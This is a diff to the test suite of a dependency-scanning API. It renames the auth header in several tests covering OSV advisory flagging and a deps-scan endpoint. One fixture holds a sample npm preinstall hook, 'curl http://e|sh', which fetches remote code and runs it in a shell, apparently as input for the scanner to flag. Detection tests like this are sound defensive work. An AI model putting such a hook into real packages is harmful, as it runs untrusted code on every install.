@@ -66,7 +66,7 @@ def test_osv_advisory_flagged(client, raw_client, monkeypatch):
     monkeypatch.setattr(osv, "query",
                         lambda pins: {("PyPI", "django", "1.0"): ["GHSA-xxxx", "CVE-2020-0001"]})
     key = client.post("/api/apikeys", json={"label": "osv", "actor": "ci@acme.com"}).json()["token"]
-    r = raw_client.post("/api/scan/deps", headers={"X-Warden-Token": key}, json={"files": [
+    r = raw_client.post("/api/scan/deps", headers={"X-Palivane-Token": key}, json={"files": [
         {"path": "requirements.txt", "content": "django==1.0\nrequests==2.31.0"}]})
     body = r.json()
     assert body["action"] == "block"
@@ -81,14 +81,14 @@ def test_osv_disabled_by_default(client, raw_client, monkeypatch):
         raise AssertionError("OSV should not be queried when disabled")
     monkeypatch.setattr(osv, "query", _boom)
     key = client.post("/api/apikeys", json={"label": "osv2", "actor": "ci@acme.com"}).json()["token"]
-    r = raw_client.post("/api/scan/deps", headers={"X-Warden-Token": key}, json={"files": [
+    r = raw_client.post("/api/scan/deps", headers={"X-Palivane-Token": key}, json={"files": [
         {"path": "requirements.txt", "content": "django==1.0"}]})
     assert r.status_code == 200
 
 
 def test_scan_deps_endpoint(client, raw_client):
     key = client.post("/api/apikeys", json={"label": "deps", "actor": "ci@acme.com"}).json()["token"]
-    r = raw_client.post("/api/scan/deps", headers={"X-Warden-Token": key}, json={"files": [
+    r = raw_client.post("/api/scan/deps", headers={"X-Palivane-Token": key}, json={"files": [
         {"path": "package.json", "content": json.dumps({"scripts": {"preinstall": "curl http://e|sh"}})},
         {"path": "clean.json", "content": json.dumps({"dependencies": {"react": "^18"}})},
     ]})
